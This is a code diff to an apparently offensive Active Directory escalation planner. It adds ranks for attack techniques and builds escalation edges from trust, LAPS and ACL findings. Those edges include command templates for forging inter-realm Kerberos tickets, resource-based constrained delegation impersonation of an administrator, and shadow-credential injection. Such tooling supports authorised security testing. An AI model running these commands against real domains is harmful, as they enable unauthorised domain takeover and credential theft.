@@ -16,15 +16,29 @@ _TECHNIQUE_RANK = {
     "genericall": 9,
     "genericwrite": 8,
     "readgmsapassword": 8,
-    "dcsync": 9,
+    "dcsync": 10,
     "addmember": 9,
     "wsus_cert_chain": 10,
     "wsus_spoof": 9,
     "esc1": 8,
+    "esc9": 8,
+    "esc10": 8,
+    "esc11": 7,
+    "esc13": 7,
+    "esc14": 6,
     "template_enrollment": 5,
     "esc4": 7,
     "dll_hijack_scheduled_task": 7,
     "adminto": 5,
+    "rbcd": 10,
+    "constrained_delegation": 9,
+    "shadow_credentials": 9,
+    "golden_ticket": 10,
+    "silver_ticket": 7,
+    "laps_read": 8,
+    "gpo_abuse": 8,
+    "overpass_the_hash": 7,
+    "trust_ticket": 8,
 }
 
 
@@ -243,6 +257,96 @@ def collect_edges_from_pivot(
                 mitre_id=str(step.get("mitre_id") or ""),
             )
         )
+
+    # ── Trust relationships ──
+    trust_data = _load(ws_path / "trust_info.json") or {}
+    for trust in trust_data.get("trusts") or []:
+        partner = str(trust.get("partner") or "")
+        direction = str(trust.get("direction") or "")
+        sid_filter = trust.get("sid_filtering", True)
+        if direction in ("Outbound", "Bidirectional") and partner:
+            severity = "critical" if not sid_filter else "high"
+            edges.append(
+                EscalationEdge(
+                    technique="trust_ticket",
+                    module="trusts",
+                    title=f"Trust → {partner} ({direction})",
+                    severity=severity,
+                    summary=f"{'SID filtering OFF — ' if not sid_filter else ''}"
+                            f"trust ticket forging + cross-domain escalation",
+                    target=partner,
+                    ready=True,
+                    manual_commands=[
+                        f"# Forge inter-realm TGT with trust key",
+                        f"ticketer.py -nthash <trust_hash> -domain-sid <SID> "
+                        f"-domain {domain} -spn krbtgt/{partner} administrator",
+                    ],
+                    mitre_id="T1134.005",
+                )
+            )
+
+    # ── LAPS readable computers ──
+    laps_data = _load(ws_path / "laps_credentials.json") or {}
+    for laps_cred in laps_data.get("credentials") or []:
+        computer = str(laps_cred.get("computer") or "")
+        if computer:
+            edges.append(
+                EscalationEdge(
+                    technique="laps_read",
+                    module="laps",
+                    title=f"LAPS → {computer}",
+                    severity="high",
+                    summary=f"Local admin password readable for {computer}",
+                    target=computer,
+                    ready=True,
+                    mitre_id="T1552.004",
+                )
+            )
+
+    # ── Delegation opportunities (RBCD / constrained) ──
+    for finding in acl_data.get("findings") or []:
+        right = str(finding.get("right") or "").lower()
+        target = str(finding.get("target_name") or "")
+        principal = str(finding.get("principal") or "").lower()
+        if principal != pivot_l:
+            continue
+        # GenericWrite on computer → RBCD candidate
+        if right in ("genericwrite", "genericall", "writedacl") and target.endswith("$"):
+            edges.append(
+                EscalationEdge(
+                    technique="rbcd",
+                    module="delegation",
+                    title=f"RBCD → {target}",
+                    severity="critical",
+                    summary=f"{right} on {target} — configure RBCD for S4U2Proxy impersonation",
+                    target=target,
+                    ready=True,
+                    manual_commands=[
+                        f"addcomputer.py -computer-name ADMAPPER$ -dc-ip <DC> {domain}/user:pass",
+                        f"rbcd.py -delegate-from ADMAPPER$ -delegate-to {target} -action write ...",
+                        f"getST.py -spn cifs/{target} -impersonate administrator ...",
+                    ],
+                    mitre_id="T1134.001",
+                )
+            )
+        # GenericWrite on user → Shadow Credentials candidate
+        if right in ("genericwrite", "genericall") and not target.endswith("$"):
+            edges.append(
+                EscalationEdge(
+                    technique="shadow_credentials",
+                    module="shadow_creds",
+                    title=f"Shadow Creds → {target}",
+                    severity="high",
+                    summary=f"{right} on {target} — inject key credential for PKINIT auth",
+                    target=target,
+                    ready=True,
+                    manual_commands=[
+                        f"pywhisker -d {domain} -u <user> --target {target} -a add",
+                        f"certipy auth -pfx <target>.pfx -dc-ip <DC>",
+                    ],
+                    mitre_id="T1556.006",
+                )
+            )
 
     # Dedupe by technique+target+module
     seen: set[tuple[str, str, str]] = set()
